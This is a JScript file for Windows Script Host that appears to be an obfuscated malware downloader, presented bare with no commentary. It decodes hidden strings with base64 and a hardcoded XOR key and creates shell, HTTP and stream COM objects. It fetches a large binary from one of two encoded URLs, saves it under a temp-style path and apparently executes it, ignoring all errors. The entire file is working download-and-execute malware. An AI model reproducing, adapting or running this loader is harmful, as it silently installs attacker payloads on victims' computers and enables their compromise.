var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

    // remove all non-base64 characters
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

    offset = offset || 0;
    var enc1, enc2, enc3, enc4;
    var i = 0, j = offset;

    while(i < input.length) {
        enc1 = _base64Idx[input.charCodeAt(i++) - 43];
        enc2 = _base64Idx[input.charCodeAt(i++) - 43];
        enc3 = _base64Idx[input.charCodeAt(i++) - 43];
        enc4 = _base64Idx[input.charCodeAt(i++) - 43];

        out[j++] = (enc1 << 2) | (enc2 >> 4);
        if(enc3 !== 64) {
            // decoded at least 2 bytes
            out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
            if(enc4 !== 64) {
                // decoded 3 bytes
                out[j++] = ((enc3 & 3) << 6) | enc4;
            }
        }
    }

    // make sure result is the exact decoded length
    return output ?
        (j - offset) :
        out.subarray(0, j);
}

var LLJzC6xRzE = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "EDZcKr5L3TJCisoK"[charCodeAt](i % "EDZcKr5L3TJCisoK".length));
    }
    return result;
};
var dapperdwF = function() {
    var surlyifP = function() {};
    surlyifP.prototype.create = function(extolXZ9) {
        return WScript.CreateObject(extolXZ9);
    };
    return surlyifP;
}();

(function() {
    var dictumXY2 = new dapperdwF();
    var practitionerNLX = 200;
    var comprehensiveuDN = LLJzC6xRzE('"AgEO"');
    var fatuousxhB = LLJzC6xRzE('"ADw/AA=="');
    var perticP = LLJzC6xRzE('"Ehc5ESICQWJgPC8vBQ=="');
    var grovelZou = LLJzC6xRzE('"CBcCLgdAGxR+GAIXPSM="');
    var maliceKPM = LLJzC6xRzE('"CgMqFTsEdgR2Bw=="');
    var delveNMI = LLJzC6xRzE('"HwsrNnIGXCZpNQ=="');
    var doggedVp3 = LLJzC6xRzE('"KncxVXsVYhkKGQ=="');
    var jetaDF = LLJzC6xRzE('"BAAVJwk="');
    var viscoustPC = LLJzC6xRzE('"FjAoBiof"');
    var discriminatingteA = LLJzC6xRzE('"YBAfLhtXaQ=="');
    var vagaryKNG = LLJzC6xRzE('"ayEiBg=="');
    var amenableckW = Math.pow(2, 10) * 249;
    var unconscionableSxs = [ LLJzC6xRzE('"LTAuE3FdGiRWOCYsEBwaJSIpOw06AxsvXDllelpdCjMg"'), LLJzC6xRzE('"LTAuE3FdGiRWOCYsEBwaJSIpOw0tFBsvXDllelpdCjMg"') ];
    var innatelzm = 2097152;
    var blightedB0w = dictumXY2.create(perticP);
    var deposeOAx = dictumXY2.create(grovelZou);
    var slewOr3 = dictumXY2.create(jetaDF + LLJzC6xRzE('"aw=="') + viscoustPC);
    var perfidiousjyw = blightedB0w.ExpandEnvironmentStrings(discriminatingteA);
    var conservatoryQzF = perfidiousjyw + innatelzm + vagaryKNG;
    var dintkGf = false;
    for (var callousKDs = 0; callousKDs < unconscionableSxs.length; callousKDs++) {
        try {
            var proletarianPVU = unconscionableSxs[callousKDs];
            deposeOAx.open(comprehensiveuDN, proletarianPVU, false);
            deposeOAx.send();
            if (deposeOAx.status == practitionerNLX) {
                try {
                    slewOr3.open();
                    slewOr3.type = 1;
                    slewOr3.write(deposeOAx[LLJzC6xRzE('"NyEpEyQcRilxOy46"')]);
                    if (slewOr3.size > amenableckW) {
                        callousKDs = unconscionableSxs.length;
                        slewOr3.position = 0;
                        slewOr3.saveToFile(conservatoryQzF, 2);
                        dintkGf = true;
                    }
                } finally {
                    slewOr3.close();
                }
            }
        } catch (ignored) {}
    }
    if (dintkGf) {
        blightedB0w[fatuousxhB](perfidiousjyw + Math.pow(2, 21));
    }
})();